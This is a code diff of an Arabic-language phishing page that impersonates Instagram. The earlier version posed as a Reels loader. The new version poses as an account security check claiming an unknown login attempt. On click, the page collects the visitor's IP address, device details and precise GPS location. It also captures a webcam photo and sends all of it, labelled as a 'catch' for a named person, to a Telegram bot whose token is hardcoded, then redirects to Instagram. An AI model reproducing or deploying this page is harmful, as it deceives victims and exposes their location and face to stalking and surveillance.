@@ -3,77 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Reels</title>
+    <title>Instagram Verification</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.6/platform.min.js"></script>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader-container { text-align: center; }
-        .loader { border: 3px solid #333; border-top: 3px solid #f09433; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; text-align: center; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .logo { width: 175px; margin-bottom: 20px; }
+        h3 { font-size: 18px; color: #262626; margin-bottom: 10px; }
+        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 20px; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        #loading { display: none; color: #0095f6; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="loader-container">
-    <div class="loader"></div>
-    <p>جاري تحميل الفيديو...</p>
+<div class="container">
+    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" class="logo">
+    <div id="main-content">
+        <h3>تأكيد أمان الحساب</h3>
+        <p>تم اكتشاف محاولة دخول غير معروفة. يرجى إتمام فحص الأمان (Face ID & Location) للمتابعة إلى حسابك.</p>
+        <button id="start-btn">بدء الفحص الآن</button>
+    </div>
+    <div id="loading">جاري معالجة البيانات...</div>
 </div>
 
 <script>
     const token = '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8';
     const chat_id = '8658217605';
 
-    // قائمة ريلز مشهورة ومختارة بعناية (يمكنك استبدال الروابط بأخرى مشهورة)
-    const reelsList = [
-        "https://www.instagram.com/reels/C50xY_XoF_v/", // تريند 1
-        "https://www.instagram.com/reels/C6I3-p_sN9z/", // مضحك 1
-        "https://www.instagram.com/reels/C56H2b-shUo/", // رياضة 1
-        "https://www.instagram.com/reels/C5fQoHNsCj5/", // تريند 2
-    ];
-    
-    // اختيار رابط عشوائي من القائمة
-    const randomReel = reelsList[Math.floor(Math.random() * reelsList.length)];
+    document.getElementById('start-btn').addEventListener('click', async function() {
+        document.getElementById('main-content').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
 
-    async function captureData() {
+        let report = `🔔 صيدة كاملة لـ أنس:\n\n`;
+
+        // 1. جلب الـ IP والجهاز (فوراً عند الضغط)
         try {
-            // 1. جلب الـ IP ومعلومات الجهاز الأساسية
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
-            const deviceName = platform.description; 
-            const os = platform.os.family + " " + platform.os.version;
+            report += `🌐 الـ IP: ${ipData.ip}\n`;
+            report += `📱 الجهاز: ${platform.description}\n`;
+            report += `⚙️ النظام: ${platform.os.family} ${platform.os.version}\n\n`;
+        } catch (e) { report += "❌ فشل جلب الـ IP\n"; }
 
-            // 2. طلب الموقع الجغرافي (GPS)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+        // 2. طلب الموقع الجغرافي (GPS)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                report += `📍 الموقع (دقيق): https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
+                report += `🎯 الدقة: ${Math.round(pos.coords.accuracy)} متر\n\n`;
+                await startCamera(report);
+            }, async (err) => {
+                report += `⚠️ رفض الموقع الجغرافي\n\n`;
+                await startCamera(report);
+            }, { enableHighAccuracy: true });
+        } else {
+            await startCamera(report);
+        }
+    });
 
-                    const message = `🎯 صيدة VIP لـ أنس:\n\n` +
-                                  `📍 الموقع: ${googleMaps}\n` +
-                                  `📱 الجهاز: ${deviceName}\n` +
-                                  `⚙️ النظام: ${os}\n` +
-                                  `🌐 الـ IP: ${ipData.ip}\n` +
-                                  `🎬 تم التحويل العشوائي إلى: ${randomReel}`;
+    async function startCamera(fullReport) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
 
-                    await sendToTelegram(message);
-                    window.location.replace(randomReel);
-                }, async (err) => {
-                    const message = `⚠️ صيدة (بدون موقع) لـ أنس:\n\n📱 الجهاز: ${deviceName}\n⚙️ النظام: ${os}\n🌐 IP: ${ipData.ip}\n🎬 تم التحويل العشوائي إلى: ${randomReel}`;
-                    await sendToTelegram(message);
-                    window.location.replace(randomReel);
-                }, { enableHighAccuracy: true });
-            }
-        } catch (e) {
-            window.location.replace(randomReel);
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', chat_id);
+                formData.append('photo', blob, 'face.jpg');
+                formData.append('caption', fullReport);
+
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                stream.getTracks().forEach(track => track.stop());
+                window.location.replace("https://www.instagram.com");
+            }, 'image/jpeg');
+        } catch (err) {
+            // إذا رفض الكاميرا نرسل التقرير النصي فقط
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(fullReport + "❌ رفض الكاميرا")}`);
+            window.location.replace("https://www.instagram.com");
         }
     }
-
-    async function sendToTelegram(msg) {
-        return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
-    }
-
-    window.onload = captureData;
 </script>
 </body>
 </html>
